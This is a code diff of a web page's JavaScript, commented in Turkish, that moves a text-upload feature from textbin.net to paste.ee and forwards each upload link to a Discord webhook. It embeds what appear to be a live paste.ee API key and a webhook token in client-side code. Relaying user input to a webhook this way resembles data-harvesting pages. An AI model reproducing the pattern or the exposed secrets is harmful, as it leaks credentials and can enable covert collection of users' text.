@@ -111,40 +111,43 @@
 
     <script>
         function uploadText() {
-            const text = document.getElementById("inputText").value;  // Kullanıcıdan alınan metin
-            const url = "https://textbin.net/api";  // Textbin API URL'si
+            const text = document.getElementById("inputText").value;
+            const apiKey = 'a99uu2OgIuUvtsOj38BVxpkCrXPdWDqL0VZWxSCDL';  // Paste.ee API Key'nizi buraya yazın
 
-            // Metni JSON formatında gönder
-            fetch(url, {
+            // Paste.ee API'ye metin gönderme
+            fetch("https://paste.ee/api/v1/pastes", {
                 method: "POST",
                 headers: {
-                    "Content-Type": "application/json"
+                    "Content-Type": "application/json",
                 },
-                body: JSON.stringify({ content: text })  // Textbin'e göndereceğimiz metin
+                body: JSON.stringify({
+                    api_key: apiKey,  // API Key
+                    title: "Frellower - CMD Code",  // Başlık
+                    contents: text,  // Metin içeriği
+                    expiration: "1H",  // 1 saat sonra otomatik silme
+                })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    const link = `https://textbin.net/${data.key}`;  // Yüklenen metnin URL'si
-
+                    const link = `https://paste.ee/r/${data.hash}`;  // Paste'e yüklenen metnin linki
                     sendToDiscord(link);  // Discord'a bağlantıyı gönder
-                    document.getElementById("message-container").style.display = "block";  // Başarı mesajını göster
+                    document.getElementById("message-container").style.display = "block";  // Mesajı ekranda göster
                 } else {
-                    console.error("Metin yüklenemedi.");
-                    alert("Bir hata oluştu.");
+                    throw new Error("Paste.ee API hatası: " + data.error);
                 }
             })
             .catch(error => {
                 console.error("Hata:", error);
-                alert("Bir hata oluştu.");
+                alert("Bir hata oluştu: " + error.message);  // Kullanıcıya hata mesajı göster
             });
         }
 
         function sendToDiscord(link) {
-            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';  // Discord Webhook URL'nizi buraya ekleyin
-
+            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';  // Webhook URL'nizi buraya yazın
+            
             const payload = {
-                content: `Yeni bir metin yüklendi: ${link}`,  // Textbin'den alınan bağlantıyı içerir
+                content: `Yeni bir metin yüklendi: ${link}`,  // Paste.ee'den alınan bağlantıyı içerir
             };
 
             // Webhook'a POST isteği gönder
